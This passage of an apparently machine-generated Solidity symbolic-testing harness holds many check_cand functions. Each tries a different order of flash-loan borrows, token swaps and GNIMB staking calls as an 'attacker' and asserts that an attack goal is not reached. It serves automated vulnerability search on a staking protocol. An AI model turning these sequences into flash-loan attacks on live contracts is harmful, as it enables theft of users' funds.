        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
